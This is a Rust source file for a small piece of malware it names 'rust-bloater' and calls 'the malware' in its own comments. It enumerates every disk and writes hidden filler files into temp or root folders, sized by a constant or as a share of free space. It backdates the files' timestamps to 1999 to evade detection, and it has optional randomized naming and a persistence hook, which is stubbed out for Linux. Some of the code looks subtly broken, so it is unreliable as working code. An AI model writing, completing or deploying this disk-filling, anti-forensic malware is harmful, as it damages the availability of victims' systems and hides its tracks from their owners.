
use core::slice;
use std::fs::*;
use std::io::*;

#[cfg(target_os = "windows")] mod windows;
#[cfg(target_os = "windows")] use windows as compiled_os;

#[cfg(target_os = "linux")] mod linux;
#[cfg(target_os = "linux")] use linux as compiled_os;


use std::path::Path;
use rand::{Rng, thread_rng};
use rand::distributions::Alphanumeric;
use regex::Regex;
use sysinfo::Disks;
use filetime::{set_file_times,FileTime};
use std::iter;


static OUTPUT_PATH: &'static [&str] = &[r"/temp/", r"/tmp/", r"/"];

static BLOAT_SIZE_CONSTANT: bool = true;
static BLOAT_CAPACITY: f64 = 0.10; // Between 0.0 and 1.0. It only work if the BLOAT_SIZE_CONSTANT is set to false. Initially set to 10% of the disk storage.


// Slice the string to get the root disk letter if it's Windows or the disk path on Linux
fn slice_string(input: &str) -> &str {
	// Separate the string at specific characters
	let pattern = Regex::new(r"(\\)|(/)").unwrap();
	let parts: Vec<&str> = pattern.split(input).collect();

	// Return the first part
	return parts[0];
}



#[cfg(target_os = "linux")]
// Create the file when compiled on Linux system
fn create_bloatfile(path: &str, name:String, data: Vec<u8>) -> String{	

	let path_file: String = format!("{}.{}.bh",path,name);

	// Create an hidden file (linux only)
	let mut file = File::create(&path_file);
	let _ = file.write_all(&data);

	return path_file

}




#[cfg(target_os = "linux")]
// Adding persistence for the linux compilation
fn adding_persistence(filepath: &str, exe_name: &str) -> std::io::Result<()>{
	Ok(())	
}




fn main() -> std::io::Result<()> {

	// Get a list of the disks on the machine
	let disks = Disks::new_with_refreshed_list();	
	let mut disk_array = Vec::new();

	// Add all the disks found in an array
	for disk in &disks {
		let info:(&str, u64, u64) = (slice_string(disk.mount_point().to_str().unwrap()), disk.total_space(), disk.available_space());		
		disk_array.push(info);
		println!("Disk : {:?}",info);

	}	

	// Bloating each disks found
	for disk in disk_array{

		// Separate informations of the disk found
		let (disk_root, total_space, available_space) = disk;

		// Search for a valid path to write to
		let mut valid_path = String::new();

		// Try different path on the disk where it can write to
		let mut has_found_path = false;

		for path in OUTPUT_PATH {
		let temp_path:String = format!("{}{}",disk_root, path).as_str().to_string();
		println!("Trying path : {}", temp_path);
		// If a valid path is found
		if Path::new(&temp_path).is_dir() {
			valid_path = temp_path; 
			println!("Valid path : {}", valid_path);
			has_found_path = true;
			break;
			}
		}

		// If no paths are found
		if !has_found_path{
			// Select the next disks
			continue
		}
		// At this point, we found a valid folder for the disk

		// Create a random number
		let mut rng = rand::thread_rng();
		
		// Create the files (one file is created for now)
		for i in 1..2{

			// Give an initial name to the file created
			let mut filename: String = format!("file-{}", i);

			let filesize = (available_space as f64) * BLOAT_CAPACITY;
			
			// Give a random name to the file if the feature is enabled
			#[cfg(feature="randomized")]{
				// Generate a random numbers
				let number:u64 = rng.gen();
				filename = number.to_string();
			}

			// Vec with specified size (number of elements in the vector)
			// Proportionnal size to the disk
			//let encoded: Vec<u8> = vec![0;size.try_into().unwrap()];

			// Constant size
			// 1Mo =  1_048_576
			// 16Mo = 16_777_216
			// 128Mo = 134_217_728
			let mut encoded: Vec<u8> = vec![0;1_048_576];
			if BLOAT_SIZE_CONSTANT == false {
				encoded= vec![0;filesize as usize];
			}

			
			// Create the bloat file
			let path_file: String = compiled_os::create_bloatfile(&valid_path,filename,encoded);
			
			// Change the access and modified date to 1999
			let _ = set_file_times(path_file, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));
			
			}


			// Add persistence to the malware if the feature is enabled
			#[cfg(feature="persistent")]{

				let mut exe_name:String = format!("rust-bloater");
				
				// Give the executable a random name if the feature is enabled
				#[cfg(feature="randomized")]{
				let mut rng = thread_rng();
				exe_name = iter::repeat(()).map(|()| rng.sample(Alphanumeric)).map(char::from).take(10).collect();
				}

				let _ = compiled_os::adding_persistence(&valid_path, &exe_name);

				}
			

	}	


	// Remove the file the initial file
	/*
	#[cfg(feature="persistent")]{
	std::fs::remove_file(previous_exe_path)?;
	}
	*/
	
	Ok(())

}
